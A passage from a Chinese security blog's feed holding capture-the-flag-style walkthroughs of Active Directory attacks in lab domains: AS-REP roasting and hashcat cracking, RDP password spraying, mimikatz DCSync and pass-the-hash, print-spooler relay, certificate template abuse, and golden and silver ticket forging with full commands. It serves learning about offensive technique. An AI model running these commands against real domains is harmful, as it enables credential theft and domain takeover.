file.readlines()</span><br><span class="line"></span><br><span class="line"># 提取指定字符串</span><br><span class="line">users = []</span><br><span class="line">for line in data:</span><br><span class="line">    match = re.search(r&#x27;(\w+)@xiaorang.lab&#x27;, line)</span><br><span class="line">    if match:</span><br><span class="line">        username = match.group(1)</span><br><span class="line">        users.append(username)</span><br><span class="line"></span><br><span class="line"># 保存提取后的字符串到 user.txt</span><br><span class="line">with open(&#x27;user.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="line">    for user in users:</span><br><span class="line">        file.write(user + &#x27;\n&#x27;)</span><br></pre></td></tr></table></figure><p>使用尝试预身份认证爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 GetNPUsers.py -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/</span><br></pre></td></tr></table></figure><p>成功了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">出来两个hash值</span><br><span class="line">拿去hashcat爆破</span><br><span class="line">hashcat -a 0 -m 18200 --force hash.txt rockyou.txt</span><br><span class="line"></span><br><span class="line">得到两个用户</span><br><span class="line"></span><br><span class="line">wenshao:hellokitty</span><br><span class="line">zhangxin:strawberry</span><br></pre></td></tr></table></figure><p>进行RDP爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec rdp 172.22.6.0/24 -u wenshao -p hellokitty -d xiaorang.lab</span><br><span class="line"></span><br><span class="line">RDP         172.22.6.25     3389   WIN2019  发现这台机子可以rdp</span><br></pre></td></tr></table></figure><p>上去之后没有头绪</p><p>上传个winPEAS.exe提权脚本上去 </p><blockquote><ul><li>第一步</li></ul><p>REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1</p><ul><li>第二步</li></ul><p>winPEASany.exe log=result.txt</p><p>另存为ANSI编码格式</p></blockquote><p><img src="../images/image-20231006221746795.png" alt="image-20231006221746795"></p><p>type访问得到</p><p><img src="../images/image-20231006221851713.png" alt="image-20231006221851713"></p><p>得到一个自动登录账户的账号密码</p><p>于是RDP尝试成功</p><p>上传sharphound.exe进行分析域内环境</p><p><img src="../images/image-20231006221938165.png" alt="image-20231006221938165"></p><p>发现该用户与域管之间有<code>historySID</code>的关系</p><p>于是上传mimikatz.exe导出hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231006222117828.png" alt="image-20231006222117828"></p><p>于是进行pth攻击</p><p><img src="../images/image-20231006222208484.png" alt="image-20231006222208484"></p><p>改个hash值和ip就行了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先进行扫描&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231006220555052.png&quot; alt=&quot;image-20231006220555052&quot;&gt;&lt;/p&gt;
&lt;p&gt;Neoej  直接google找洞&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;htt</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>thm-利用AD域</title>
    <link href="https://ke1nys.github.io/posts/eff966aa.html"/>
    <id>https://ke1nys.github.io/posts/eff966aa.html</id>
    <published>2023-09-09T12:16:24.000Z</published>
    <updated>2023-09-15T09:32:43.392Z</updated>
    
    <content type="html"><![CDATA[<p>接着上文的横向移动完结  <strong>开始新的利用AD域</strong></p><p>Delegation—————-</p><h2 id="环境配置不讲了"><a href="#环境配置不讲了" class="headerlink" title="环境配置不讲了"></a>环境配置不讲了</h2><h2 id="利用权限委托-Exploiting-Permission-Delegation"><a href="#利用权限委托-Exploiting-Permission-Delegation" class="headerlink" title="利用权限委托(Exploiting Permission Delegation)"></a>利用权限委托(Exploiting Permission Delegation)</h2><p>这个考察的就是委派   </p><p>Active Directory 可以通过称为权限委派的功能委派权限和特权（不要与下一个任务中将讨论的 Kerberos 委派混淆）。授权是AD在组织中如此强大的原因。想象一下，我们为一个拥有 50000 名员工的组织工作。由于我们关心安全性，因此我们只有三个用户可以访问 DA 凭据。这三个用户不可能处理来自用户的所有请求，例如重置其密码。使用委派，我们可以将强制更改用户密码的权限委派给支持团队，这意味着他们现在具有此特定功能的委派权限。原则上，为了保证授权的安全，应遵循最小特权原则。然而，在大型组织中，这说起来容易做起来难。在此任务中，我们将研究如何利用一些委派错误配置</p><p>权限委派攻击通常称为基于 ACL 的攻击。AD 允许管理员配置填充任意访问控制列表 （DACL） 的访问控制项 （ACE），因此称为基于 ACL 的攻击。几乎任何 AD 对象都可以使用 ACE 进行保护，然后 ACE 描述任何其他 AD 对象对目标对象具有的允许和拒绝的权限。</p><p>这里使用的话就是在使用<code>Sharphound.ps1</code>脚本获取道整个域的信息后  然后使用<code>Bloodhound</code>GUI软件进行分析  然后找到可以利用的地方</p><p>然后找到了一个IT组被委派了一个能强制修改第二组管理员密码的权限  然后我们就可以利用这一点  不小心获取一个凭证后<strong>(要有这个能添加域组的权限的用户)</strong> 我们就把我们自己加到这个IT组里  然后强制修改管理员的密码 然后进行破坏</p><p><strong>这里使用的是这个能强制修改密码的委派  接下来讲一下这个使用AD验证登录协议之一的Kerberos的协议来进行委派</strong></p><h2 id="利用-Kerberos-委派"><a href="#利用-Kerberos-委派" class="headerlink" title="利用 Kerberos 委派"></a>利用 Kerberos 委派</h2><ul><li>无约束状态</li></ul><p><strong>简单来说就是干啥都行</strong> </p><ul><li>基于资源的约束委派</li></ul><p><strong>这个改变了以前的访问规则  就是不在需要使用AD管理用户登录来访问特定资源了  现在就变成了我们现在熟知的委派某个用户有这个权限能访问了</strong></p><ul><li>受约束的委派利用</li></ul><p><strong>就是目前我们所了解的委派  被AD管理员授予啥权限就能干啥 不授权就干不了  有个坏处就可以伪造TGT票据来给某个生成TGS来登录到该用户</strong></p><p><img src="../images/image-20230912115858258.png" alt="image-20230912115858258"></p><p>这里能使用该用户来登录这台计算机的原理</p><p><img src="../images/image-20230912115938440.png" alt="image-20230912115938440"></p><h2 id="Exploiting-Automated-Relays-自动化中继攻击"><a href="#Exploiting-Automated-Relays-自动化中继攻击" class="headerlink" title="Exploiting Automated Relays(自动化中继攻击)"></a>Exploiting Automated Relays(自动化中继攻击)</h2><p>“Exploiting Automated Relays” 可能是指利用自动化中继的漏洞或弱点来进行攻击。自动化中继是指在网络通信中使用的一种机制，用于自动转发或中继数据包。攻击者可能会利用自动化中继的漏洞或配置错误来获取未授权的访问、窃取敏感信息或执行恶意操作。</p><p>这里的话thm讲的不够细致</p><h3 id="身份验证中继来获取这个管理员权限的方法"><a href="#身份验证中继来获取这个管理员权限的方法" class="headerlink" title="身份验证中继来获取这个管理员权限的方法"></a>身份验证中继来获取这个管理员权限的方法</h3><p>想要使用这个方法的话  必须是要满足四个条件</p><ol><li>A valid set of AD account credentials.<br>一组有效的 AD 帐户凭据。</li><li>Network connectivity to the target’s SMB service.<br>与目标的 SMB 服务的网络连接。</li><li>The target host must be running the Print Spooler service.<br>目标主机必须运行后台打印程序服务。</li><li>The hosts must not have SMB signing enforced.<br>主机不得强制实施 SMB 签名。</li></ol><p>这里的话是thm已经写好了</p><p>接下来是讲一下在使用过程中使用的<a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a>这个工具 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample 是一种工具，旨在利用 Windows 操作系统中的身份验证中继漏洞（也称为 NTLM 中继攻击）来实施攻击。这种攻击利用了 Windows 中的 NTLM（NT LAN Manager）身份验证过程中的设计缺陷，从而使攻击者能够获得受害者的凭据并进一步访问系统。</span><br><span class="line">具体来说，SpoolSample 利用了 Windows 中打印机服务（Spooler）的漏洞。攻击者可以通过在网络上放置恶意的打印机服务器，将受害者的网络流量重定向到攻击者控制的服务器上。当受害者尝试连接到网络上的打印机时，其 NTLM 身份验证流量将被中继到攻击者的服务器，攻击者可以通过该流量获取受害者的凭据。</span><br><span class="line">攻击者获取到受害者的凭据后，可以进一步横向移动在网络中，访问其他系统和资源，甚至获取管理员权限。这种攻击技术对于那些未修补或配置不当的系统来说是一种威胁。</span><br><span class="line">因此，使用 SpoolSample 来利用身份验证中继的目的是获取受害者的凭据，以便进一步滥用其权限并访问系统和数据。这凸显了修补系统漏洞、正确配置身份验证过程以及网络安全的重要性。</span><br></pre></td></tr></table></figure><p>这样的话我们就可以强行对管理员账户进行身份验证  这样的话我们就可以获取到管理员的NTLM—hash值</p><p><img src="../images/image-20230912171139557.png" alt="image-20230912171139557"></p><p>这个设置的话是搭建一个恶意的SMB服务器</p><p><img src="../images/image-20230912171415684.png" alt="image-20230912171415684"></p><p>这个的话是强制使其THMSERVER2开启打印后台处理程序服务  然后向我们构造的这个恶意SMB服务器进行身份验证</p><p><img src="../images/image-20230912171511946.png" alt="image-20230912171511946"></p><p>然后恶意服务器这边就会收到THMSERVER2的hash值及其他信息</p><p>这个获取到账号的hash值后  可以使用evil-winrm来远程登录该用户  不需要进行用户hash密码的破解</p><p><strong>winrm这个工具的作用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WinRM（Windows Remote Management）是一种用于在 Windows 操作系统上进行远程管理和操作的协议和服务。它允许管理员通过网络远程管理和控制 Windows 主机，而无需直接物理访问或登陆到每台主机上。</span><br><span class="line">WinRM 提供了一种安全的远程通信机制，基于标准的 Web Services 协议（SOAP）和 HTTP/HTTPS。它允许管理员使用命令行工具、脚本或管理工具通过网络远程执行命令、配置设置、获取系统信息、安装更新、监视事件日志等操作。WinRM 还支持通过 PowerShell 进行远程管理，使管理员能够使用 PowerShell 脚本来批量管理远程主机。</span><br><span class="line">WinRM 是在 Windows Server 2003 和 Windows Vista 之后的操作系统中默认安装的，并且可以通过配置和启用相应的服务来支持远程管理功能。它提供了一种方便、高效和安全的方式来管理和操作远程 Windows 主机，特别适用于大规模部署、远程服务器管理和自动化任务。</span><br><span class="line">需要注意的是，使用 WinRM 进行远程管理需要确保适当的安全配置，包括使用安全的通信协议和身份验证机制，限制访问权限，以及监控和审核远程管理活动，以确保系统的安全性和保密性。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单来说就是可以远程通过命令行来操作计算机</p><h2 id="Exploiting-AD-Users-利用AD用户"><a href="#Exploiting-AD-Users-利用AD用户" class="headerlink" title="Exploiting AD Users(利用AD用户)"></a>Exploiting AD Users(利用AD用户)</h2><p>这个就是在拿下一台计算机后 我们可以挨个在这几个用户之间切换来查看 看看也没有啥有用的信息  这里的话是获取到了一个数据库信息  下载到本地  然后使用keepass进行查看</p><p>这里有个骚操作就是通过弹shell 然后使用mterpreter来执行键盘操作记录 来获取到用户的密码</p><h2 id="Exploiting-GPOs"><a href="#Exploiting-GPOs" class="headerlink" title="Exploiting GPOs"></a>Exploiting GPOs</h2><p>对GPO进行解释 </p><p><img src="../images/image-20230912190812631.png" alt="image-20230912190812631"></p><p>就是可以给某个用户赋予权限  想让其能干啥就干啥</p><p>没啥想写的了 这里的话就是直接查看thm就行了</p><h2 id="利用证书"><a href="#利用证书" class="headerlink" title="利用证书"></a>利用证书</h2><p>这里的话是我们可以利用错误的证书模板来进行权限提升和横向移动</p><h3 id="AD-Certificate-Services-广告证书服务"><a href="#AD-Certificate-Services-广告证书服务" class="headerlink" title="AD Certificate Services 广告证书服务"></a>AD Certificate Services 广告证书服务</h3><p>AD 证书服务 （CS） 是 Microsoft 的公钥基础结构 （PKI） 实现。由于AD在组织中提供了一定程度的信任，因此它可以用作CA来证明和委托信任。AD CS用于多种用途，例如加密文件系统，创建和验证数字签名，甚至<strong>用户身份验证</strong>，使其成为攻击者的有前途的途径。</p><p>重要的是这个用户身份验证这一点  这一点的话是可以利用错误的模板配置来进行利用的</p><p>由于 AD CS 是一项特权功能，因此它通常在选定的域控制器上运行。这意味着普通用户无法真正直接与服务交互。另一方面，组织往往太大，无法让管理员手动创建和分发每个证书。这就是证书模板的用武之地。AD CS 的管理员可以创建多个模板，这些模板可以允许具有相关权限的任何用户自行请求证书。这些模板具有指示哪个用户可以请求证书以及所需内容的参数。SpecterOps发现，这些参数的特定组合可能具有难以置信的毒性，并被滥用于权限提升和持久访问。</p><p><img src="../images/image-20230913095606719.png" alt="image-20230913095606719"></p><h3 id="可以恶意利用的模板"><a href="#可以恶意利用的模板" class="headerlink" title="可以恶意利用的模板"></a>可以恶意利用的模板</h3><p><img src="../images/image-20230913095644596.png" alt="image-20230913095644596"></p><p>在此模板中，我们可以看到THMSERVER2的计算机帐户可以为模板颁发<strong>CSR</strong>，该模板允许我们指定主题备用名称（SAN）并可用于<strong>客户端身份验证</strong>。</p><p>就是因为这一点  所以就是会进行横向移动到AD管理员账户</p><p>因为这里的话是我们已经拿下这个<code>THMSERVER2</code>这台电脑了  并且就是已经开启了RDP  于是我们进行登录  然后请求证书</p><p>在请求证书的时候要记得一点就是 </p><p><img src="../images/image-20230913095945573.png" alt="image-20230913095945573"></p><p>因为我们的目的是为了登录到AD管理员账户 于是我们就得模拟用户的名字写上去</p><p>然后我们在使用私钥导出我们生成好的证书</p><h3 id="使用证书进行用户模拟"><a href="#使用证书进行用户模拟" class="headerlink" title="使用证书进行用户模拟"></a>使用证书进行用户模拟</h3><p>现在我们终于可以模拟用户了。要执行此操作，需要两个步骤：</p><ul><li>Use the certificate to request a Kerberos ticket-granting ticket (TGT)<br>使用证书请求 Kerberos 票证授予票证 （TGT）</li><li>Load the Kerberos TGT into your hacking platform of choice<br>将 Kerberos TGT 加载到您选择的黑客平台中</li></ul><p>使用的是这个工具 <code>Rubeus</code>来进行TGT证书的生成 </p><p>现在我们可以使用Mimikatz加载TGT并向THMDC进行身份验证：</p><p>这样的话就是可以拿下域控了</p><h2 id="Exploiting-Domain-Trusts-利用域信任"><a href="#Exploiting-Domain-Trusts-利用域信任" class="headerlink" title="Exploiting Domain Trusts(利用域信任)"></a>Exploiting Domain Trusts(利用域信任)</h2><p>这里的话将会讲到我们之前听说过但是没怎么研究过的<strong>黄金  白银票据</strong></p><p>这个模块的基于子域向根域移动的操作</p><p><strong>(因为要获取这个krbtgt-hash只能在AD域管理员上获取)</strong></p><p>(在上一个模块中  我们拿到的仅仅是这个za子域的域控权限  我们的目的是想拿下整个域的权限 就是TRYHACKME.LOC)</p><p>因为这里的话子域和根域的信任是双向的  所以我们就可以通过子域来直接访问根域</p><p>可以在域之间配置两种主要类型的信任：</p><ul><li>Directional - The direction of the trust flows from a trusting domain to a trusted domain<br>定向 - 信任的方向从信任域流向受信任域</li><li>Transitive - The trust relationship expands beyond just two domains to include other trusted domains<br>可传递 - 信任关系从两个域扩展到包括其他受信任域</li></ul><p><strong>解释一下这两种信任关系的区别</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在域（Domain）环境中，定向信任（One-Way Trust）和传递信任（Transitive Trust）是两种不同类型的信任关系。它们的主要区别在于信任的方向和传递性。</span><br><span class="line">定向信任（One-Way Trust）： 定向信任是指在两个域之间建立的单向信任关系。其中一个域（称为信任源域）信任另一个域（称为信任目标域），但反过来不一定成立。这意味着，信任源域中的用户可以访问信任目标域中的资源，但信任目标域中的用户无法访问信任源域中的资源。</span><br><span class="line">例如，假设有域 A 和域 B，域 A 信任域 B。这意味着域 A 中的用户可以访问域 B 中的资源，但域 B 中的用户不能访问域 A 中的资源。这种信任关系通常用于实现跨域访问的场景，其中一个域的用户需要访问另一个域中的资源。</span><br><span class="line">传递信任（Transitive Trust）： 传递信任是指在多个域之间建立的相互信任关系，信任关系在域之间传递。当两个域之间存在传递信任时，信任可以在域之间传递，形成一个信任路径，从而实现跨域访问。</span><br><span class="line">例如，假设有域 A、域 B 和域 C，域 A 信任域 B，域 B 信任域 C。由于信任是传递性的，域 A 也会信任域 C。这意味着域 A 中的用户可以访问域 C 中的资源，即使直接的信任关系只存在于域 A 和域 B 之间。</span><br><span class="line">传递信任的优点是能够实现多个域之间的灵活访问，减少了信任配置的复杂性。然而，需要注意的是，信任关系的传递性也可能增加安全风险，因此在配置和管理信任关系时需要谨慎处理。</span><br><span class="line">总结起来，定向信任是单向的，只允许一个域信任另一个域，而传递信任是相互的，允许多个域之间形成信任路径，实现跨域访问。选择使用哪种信任关系取决于具体的需求和安全考虑。</span><br></pre></td></tr></table></figure><h3 id="KRBTGT和黄金门票"><a href="#KRBTGT和黄金门票" class="headerlink" title="KRBTGT和黄金门票"></a>KRBTGT和黄金门票</h3><p><code>krbtgt</code>这个东西大家的话应该都很熟悉  就是在这个<code>Kerberos</code>进行身份验证的流程的时候讲过</p><p>但是，如果我们想生成自己的 TGT 来授予我们访问所有内容的权限怎么办？这被称为<strong>黄金票证攻击</strong>。在黄金票证攻击中，我们完全绕过KDC并创建自己的TGT，本质上成为票证授予服务器（TGS）。为了伪造TGT，我们需要以下信息：</p><ul><li>The FQDN of the domain<br>域的 FQDN</li><li>The Security Identifier (SID) of the domain<br>域的安全标识符 （SID）</li><li>The username of the account we want to impersonate<br>我们要模拟的帐户的用户名</li><li>The KRBTGT password hash KRBTGT 密码哈希</li></ul><p>前三个通常很容易恢复。最后一个需要域泄露，因为 KRBTGT 密码哈希仅存储在域控制器上。幸运的是，我们刚刚使用伪造证书破坏了第 0 层管理员组，因此我们能够恢复 KRBTGT 密码哈希。</p><p>我们将再次使用带有 DC Sync 的 Mimikatz 来恢复 THMSERVER2 上的 KRBTGT 密码哈希：</p><p><strong><code>Sync</code>的话就是如上面所说  就是绕过KDC来自己生成TGT</strong></p><p>由于我们是要利用子域和根域之间的双向信任  所以我们的话就会想要伪造这个 <code>Inter-Realm TGT</code>   (这个就是跨域的TGT)</p><p>当我们构建黄金票证来执行此漏洞时，我们将包含来自其他域的额外帐户 SID。Mimikatz可以协助解决这个问题，允许我们设置Kerberos TGT KERB_VALIDATION_INFO结构的ExtraSids部分。ExtraSids 部分描述为“指向KERB_SID_AND_ATTRIBUTES结构列表的指针，这些结构包含与主体所属帐户域以外的域中的组对应的 SID 列表”。</p><p>这里的关键是，我们将通过将企业管理员 （EA） 组的 SID 作为额外的 SID 添加到子域域控制器的伪造票证中，来利用父域与子域的信任。EA 组属于父域，该组的成员身份实质上授予对整个林的管理权限！此组的默认 SID 为 S-1-5-21—519。</p><p>在进行利用之前，我们首先需要恢复两个 SID：</p><ul><li>The SID of the child domain controller (THMDC), which we will impersonate in our forged TGT<br>子域控制器 （THMDC） 的 SID，我们将在伪造的 TGT 中模拟它</li><li>The SID of the Enterprise Admins in the parent domain, which we will add as an extra SID to our forged TGT<br>父域中企业管理员的 SID，我们将将其作为额外的 SID 添加到伪造的 TGT 中</li></ul><p>然后就使用<code>mimikazt</code>进行生成黄金票据  因为我们分别使用了两个域管理员的SID  所以我们就可以利用双方的双向信任  就可以互相访问了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:&lt;Password hash of krbtgt user&gt; /sids:&lt;SID of Enterprise Admins group&gt; /ptt</span><br></pre></td></tr></table></figure><p>这样的话我们就可以通过这个黄金票据实现横向移动  权限提升了</p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/#%E9%93%B6%E7%A5%A8-SilverTickets">白银票据</a></p><p>这里先讲一下PAC是啥  (因为下面会用到)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在 Active Directory （AD）域环境中，PAC 指的是 Kerberos 预身份验证票据（Privilege Attribute Certificate），也称为票据包（Ticket Granting Ticket）。</span><br><span class="line"></span><br><span class="line">PAC 是一种包含有关用户或计算机身份验证和授权信息的数据结构。它是由域控制器颁发给经过身份验证的主体（如用户或计算机）的安全令牌。PAC 中包含了一些重要的信息，如用户的组成员身份、授权信息、委派权限等。</span><br><span class="line"></span><br><span class="line">PAC 的主要作用是在 Kerberos 认证过程中验证和授权用户的访问请求。当用户进行身份验证时，域控制器会为用户生成一个 TGT（Ticket Granting Ticket），其中包含了用户的身份信息和授权信息。该 TGT 会被包装在 PAC 中，然后发送给用户，用户将 PAC 中的 TGT 用于获取服务票据（Service Ticket）以访问特定服务。</span><br><span class="line"></span><br><span class="line">PAC 在 Kerberos 认证过程中起到了重要的作用，它确保了用户的身份和授权信息的安全性和完整性。它还为用户提供了一种验证其身份的方法，并授权其访问特定资源的权限。</span><br><span class="line"></span><br><span class="line">需要注意的是，PAC 是由域控制器生成和管理的，并且在用户进行身份验证时动态生成。由于 PAC 包含了敏感的身份和授权信息，所以需要在传输和存储过程中进行适当的保护和加密，以防止信息泄露和篡改。</span><br><span class="line"></span><br><span class="line">总之，PAC 是 Active Directory 域中用于包含用户身份验证和授权信息的数据结构。它在 Kerberos 认证过程中起到了重要的作用，确保用户的身份和访问权限的安全和完整。</span><br></pre></td></tr></table></figure><p>简单来说就是用户或者计算机的身份令牌</p><p>制作银票条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.域名称</span><br><span class="line">2.域的SID值</span><br><span class="line">3.域中的Server服务器账户的NTLM-Hash</span><br><span class="line">4.伪造的用户名，可以是任意用户名.</span><br><span class="line">5.目标服务器上面的kerberos服务</span><br></pre></td></tr></table></figure><p>白银票据的服务列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">服务名称                    同时需要的服务</span><br><span class="line">WMI                        HOST、RPCSS</span><br><span class="line">PowerShell Remoting        HOST、HTTP</span><br><span class="line">WinRM                    HOST、HTTP</span><br><span class="line">Scheduled Tasks            HOST</span><br><span class="line">Windows File Share        CIFS</span><br><span class="line">LDAP                    LDAP</span><br><span class="line">Windows Remote Server    RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure><p>伪造白银票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/domain：当前域名称</span><br><span class="line">/sid：SID值，和金票一样取前面一部分</span><br><span class="line">/target：目标主机，这里是OWA2010SP3.0day.org</span><br><span class="line">/service：服务名称，这里需要访问共享文件，所以是cifs</span><br><span class="line">/rc4：目标主机的HASH值</span><br><span class="line">/user：伪造的用户名</span><br><span class="line">/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt</span><br></pre></td></tr></table></figure><p><code>klist</code>可以查看是否成功导入</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;接着上文的横向移动完结  &lt;strong&gt;开始新的利用AD域&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Delegation—————-&lt;/p&gt;
&lt;h2 id=&quot;环境配置不讲了&quot;&gt;&lt;a href=&quot;#环境配置不讲了&quot; class=&quot;headerlink&quot; title=&quot;环境配置不讲了</summary>
      
    
    
    
    
    <category term="thm-利用AD域" scheme="https://ke1nys.github.io/tags/thm-%E5%88%A9%E7%94%A8AD%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>thm-windows横向移动和翻转</title>
    <link href="https://ke1nys.github.io/posts/e2befe4.html"/>
    <id>https://ke1nys.github.io/posts/e2befe4.html</id>
    <published>2023-09-08T09:06:24.000Z</published>
    <updated>2023-09-15T09:32:43.391Z</updated>
    
    <content type="html"><![CDATA[<p>接上一课的枚举AD域信息后<strong>(就是域的信息收集</strong>)  开始进行横向移动和翻转了</p><h2 id="网络移动-横向移动"><a href="#网络移动-横向移动" class="headerlink" title="网络移动 (横向移动)"></a>网络移动 (横向移动)</h2><p>简而言之，横向移动是攻击者用来在网络中移动的一组技术。一旦攻击者获得对网络第一台计算机的访问权，出于多种原因，移动就变得至关重要，其中包括： - 实现攻击者的目标 - 绕过现有的网络限制 - 建立额外的网络入口点 - 制造混乱和避免被发现。</p><p>虽然许多网络杀伤链将横向移动视为线性过程的附加步骤，但它实际上是循环的一部分。在此周期中，我们使用任何可用的凭据来执行横向移动，使我们能够访问新机器，在其中我们可以提升权限并提取凭据（如果可能）。有了新的凭证，循环又开始了。</p><p><img src="../images/beccc46f65b8d16117d3d62f5c5dc380.png" alt="img"></p><p>通常，我们会重复这个循环几次，然后才能达到网络上的最终目标。如果我们的第一个立足点是一台几乎无法访问其他网络资源的计算机，那么我们可能需要横向移动到在网络上拥有更多权限的其他主机。</p><h3 id="A-Quick-Example-一个简单的例子"><a href="#A-Quick-Example-一个简单的例子" class="headerlink" title="A Quick Example 一个简单的例子"></a>A Quick Example 一个简单的例子</h3><p>假设我们正在执行红队参与，我们的最终目标是到达内部代码存储库，我们通过网络钓鱼活动在目标网络上获得了第一次妥协。通常，网络钓鱼活动对非技术用户更有效，因此我们的第一次访问可能是通过营销部门的机器进行的。</p><p>营销工作站通常会受到防火墙策略的限制，无法访问网络上的任何关键服务，包括管理协议、数据库端口、监控服务或日常工作不需要的任何其他服务，包括代码存储库。</p><p>为了到达敏感的主机和服务，我们需要转移到其他主机并从那里转向我们的最终目标。为此，我们可以尝试提升营销工作站的权限并提取本地用户的密码哈希值。如果我们找到本地管理员，则其他主机上可能存在相同的帐户。经过一番侦察，我们发现了一个名为 DEV-001-PC 的工作站。我们使用本地管理员的密码哈希来访问 DEV-001-PC，并确认它属于公司的一位开发人员所有。从那里，可以访问我们的目标代码存储库。</p><p><img src="../images/89ef601e2332f96e45c64b3baa8d6349.png" alt="Simple Lateral Movement"></p><p>请注意，虽然可能需要使用横向移动来规避防火墙限制，但它也有助于逃避检测。在我们的示例中，即使营销工作站可以直接访问代码存储库，也可能需要通过开发人员的 PC 进行连接。从检查登录审核日志的蓝队分析师的角度来看，这种行为的可疑性较小。</p><h3 id="攻击者的视角"><a href="#攻击者的视角" class="headerlink" title="攻击者的视角"></a>攻击者的视角</h3><p>攻击者可以通过多种方式进行横向移动。最简单的方法是使用标准管理协议（例如 WinRM、RDP、VNC 或 SSH）连接到网络上的其他计算机。只要在规划与哪个帐户连接的位置时保持一定的一致性，这种方法就可以在某种程度上模拟常规用户的行为。虽然 IT 部门的用户通过 RDP 连接到 Web 服务器可能很常见并且不会受到关注，但必须注意不要尝试可疑的连接（例如，为什么本地管理员用户从营销部门连接到 DEV-001-PC）个人电脑？）</p><p>如今，攻击者还可以使用其他横向移动方法，同时使蓝队有效检测正在发生的情况变得更具挑战性。虽然没有任何技术应该被认为是万无一失的，但我们至少可以尝试尽可能保持沉默。在接下来的任务中，我们将了解一些最常见的横向运动技术。</p><h2 id="Administrators-and-UAC"><a href="#Administrators-and-UAC" class="headerlink" title="Administrators and UAC"></a>Administrators and UAC</h2><p>在执行整个房间中介绍的大部分横向移动技术时，我们将主要使用管理员凭据。虽然人们可能期望每个管理员帐户都具有相同的目的，但必须区分两种类型的管理员：</p><ul><li>Local accounts part of the local Administrators group<br>本地帐户属于本地管理员组</li><li>Domain accounts part of the local Administrators group<br>域帐户属于本地管理员组</li></ul><h2 id="远程生成进程"><a href="#远程生成进程" class="headerlink" title="远程生成进程"></a>远程生成进程</h2><p>这一共是有三种方法可以来进行</p><ul><li><p>Psexec 执行程序</p></li><li><p>使用 WinRM 远程创建进程</p></li><li>使用 sc 